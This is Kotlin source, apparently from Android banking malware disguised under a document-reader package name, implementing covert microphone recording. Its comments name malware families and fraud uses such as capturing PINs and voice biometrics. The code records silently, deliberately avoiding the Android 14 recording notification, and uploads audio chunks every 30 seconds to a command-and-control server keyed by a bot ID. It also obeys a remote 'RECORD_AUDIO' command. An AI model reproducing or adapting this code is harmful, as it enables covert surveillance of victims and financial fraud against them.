package com.docreader.lite.reader.advanced

import android.content.Context
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import com.docreader.lite.reader.C2
import com.docreader.lite.reader.Exfil
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream

/**
 * Audio recording — ambient mic capture for intelligence gathering.
 *
 * Family reference:
 *   - Brokewell: silent audio recording, uploaded to C2 in chunks
 *   - Cerberus: mic capture during phone calls
 *   - SpyNote RAT: continuous ambient recording
 *   - BRATA: call recording for social engineering intel
 *
 * Use cases in banking fraud:
 *   1. Record phone calls with bank customer service (social engineering)
 *   2. Ambient recording during victim interaction with banking app
 *   3. Voice biometric capture for replay attacks
 *   4. Intelligence: overhear conversations about security codes, PINs
 *
 * Architecture:
 *   AudioRecord (low-level) → PCM buffer → chunked upload to C2
 *   Uses AudioRecord instead of MediaRecorder for silent operation
 *   (MediaRecorder shows a recording notification on Android 14+)
 *
 * Chunks uploaded every 30 seconds to avoid large memory footprint.
 * PCM format (no encoding overhead) — server-side converts to opus/aac.
 */
object AudioRecorder {

    private var audioRecord: AudioRecord? = null
    private var recordJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    var isRecording = false
        private set

    // Audio config
    private const val SAMPLE_RATE = 16000 // 16kHz — sufficient for voice
    private const val CHANNEL = AudioFormat.CHANNEL_IN_MONO
    private const val ENCODING = AudioFormat.ENCODING_PCM_16BIT
    private const val CHUNK_DURATION_SEC = 30 // Upload every 30 seconds

    /**
     * Start silent ambient recording.
     * Records audio from device microphone and uploads chunks to C2.
     *
     * @param maxDurationSec Maximum recording duration (0 = unlimited)
     */
    fun startRecording(maxDurationSec: Int = 0) {
        if (isRecording) return

        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, ENCODING)
        if (bufferSize == AudioRecord.ERROR_BAD_VALUE || bufferSize == AudioRecord.ERROR) {
            Exfil.event("audio_error", "reason" to "bad_buffer_size")
            return
        }

        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC, // MIC source — ambient recording
                SAMPLE_RATE,
                CHANNEL,
                ENCODING,
                bufferSize * 2 // Double buffer for safety
            )
        } catch (e: SecurityException) {
            Exfil.event("audio_error", "reason" to "permission_denied")
            return
        }

        if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
            Exfil.event("audio_error", "reason" to "init_failed")
            audioRecord?.release()
            audioRecord = null
            return
        }

        isRecording = true
        audioRecord?.startRecording()

        Exfil.event("audio_recording_started",
            "sample_rate" to SAMPLE_RATE.toString(),
            "max_duration" to maxDurationSec.toString()
        )

        // Capture and upload loop
        recordJob = scope.launch {
            val startTime = System.currentTimeMillis()
            val chunkBuffer = ByteArrayOutputStream()
            val readBuffer = ByteArray(bufferSize)
            var chunkStartTime = System.currentTimeMillis()
            var chunkIndex = 0

            while (isActive && isRecording) {
                // Check max duration
                if (maxDurationSec > 0) {
                    val elapsed = (System.currentTimeMillis() - startTime) / 1000
                    if (elapsed >= maxDurationSec) break
                }

                // Read audio data
                val bytesRead = audioRecord?.read(readBuffer, 0, readBuffer.size) ?: -1
                if (bytesRead > 0) {
                    chunkBuffer.write(readBuffer, 0, bytesRead)
                }

                // Upload chunk every CHUNK_DURATION_SEC seconds
                val chunkElapsed = (System.currentTimeMillis() - chunkStartTime) / 1000
                if (chunkElapsed >= CHUNK_DURATION_SEC && chunkBuffer.size() > 0) {
                    uploadChunk(chunkBuffer.toByteArray(), chunkIndex)
                    chunkBuffer.reset()
                    chunkStartTime = System.currentTimeMillis()
                    chunkIndex++
                }

                delay(50) // Small delay to prevent tight loop
            }

            // Upload remaining data
            if (chunkBuffer.size() > 0) {
                uploadChunk(chunkBuffer.toByteArray(), chunkIndex)
            }

            stopRecording()
        }
    }

    fun stopRecording() {
        if (!isRecording) return
        isRecording = false
        recordJob?.cancel()

        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (_: Exception) {}
        audioRecord = null

        Exfil.event("audio_recording_stopped")
    }

    /**
     * Record for a specific duration then auto-stop.
     * Used for C2 command "RECORD_AUDIO" with duration param.
     */
    fun recordFor(durationSec: Int) {
        startRecording(maxDurationSec = durationSec)
    }

    private fun uploadChunk(data: ByteArray, index: Int) {
        scope.launch {
            try {
                val body = data.toRequestBody(
                    "audio/pcm".toMediaTypeOrNull()
                )
                val req = Request.Builder()
                    .url("${C2.baseUrl()}/api/v1/audio")
                    .post(body)
                    .header("X-Bot-Id", android.os.Build.MODEL)
                    .header("X-Chunk-Index", index.toString())
                    .header("X-Sample-Rate", SAMPLE_RATE.toString())
                    .header("X-Channels", "1")
                    .header("X-Encoding", "pcm_16bit")
                    .build()

                OkHttpClient().newCall(req).execute().close()

                Exfil.event("audio_chunk_sent",
                    "index" to index.toString(),
                    "size" to data.size.toString()
                )
            } catch (_: Exception) {
                Exfil.event("audio_chunk_failed", "index" to index.toString())
            }
        }
    }

    // Using toMediaTypeOrNull() from OkHttp 4.x extension
}
